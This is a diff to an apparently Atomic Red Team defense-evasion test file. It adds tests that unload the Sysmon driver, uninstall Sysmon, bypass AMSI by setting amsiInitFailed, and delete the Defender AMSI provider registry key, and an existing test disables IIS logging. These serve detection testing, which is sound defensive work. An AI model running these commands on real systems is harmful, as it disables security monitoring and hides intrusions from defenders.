@@ -108,8 +108,15 @@ atomic_tests:
       default: SysmonDrv
   executor:
     name: command_prompt
+    elevation_required: true
+    prereq_command: |
+      fltmc.exe filters | findstr #{sysmon_driver}
     command: |
       fltmc.exe unload #{sysmon_driver}
+    cleanup_command: |
+      sc stop sysmon
+      fltmc.exe load #{sysmon_driver}
+      sc start sysmon
 
 - name: Disable Windows IIS HTTP Logging
   description: |
@@ -126,3 +133,51 @@ atomic_tests:
     name: command_prompt
     command: |
       C:\Windows\System32\inetsrv\appcmd.exe set config "#{website_name}" /section:httplogging /dontLog:true
+
+- name: Uninstall Sysmon
+  description: |
+    Uninstall Sysinternals Sysmon for Defense Evasion
+
+  supported_platforms:
+    - windows
+
+  executor:
+    name: command_prompt
+    elevation_required: true
+    prereq_command: |
+      sc query sysmon > nul
+    command: |
+      sysmon -u
+    cleanup_command: |
+      sysmon -i -accepteula
+
+- name: AMSI Bypass - AMSI InitFailed
+  description: |
+    Any easy way to bypass AMSI inspection is it patch the dll in memory setting the "amsiInitFailed" function to true. 
+    https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
+  supported_platforms:
+    - windows
+
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+    cleanup_command: |
+      [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$false)
+
+- name: AMSI Bypass - Remove AMSI Provider Reg Key
+  description: |
+    With administrative rights, an adversary can remove the AMSI Provider registry key in HKLM\Software\Microsoft\AMSI to disable AMSI inspection.
+    This test removes the Windows Defender provider registry key. 
+
+  supported_platforms:
+    - windows
+
+  executor:
+    name: powershell
+    elevation_required: true
+    command: |
+       Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse
+    cleanup_command: |
+       New-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers" -Name "{2781761E-28E0-4109-99FE-B9D127C57AFE}"
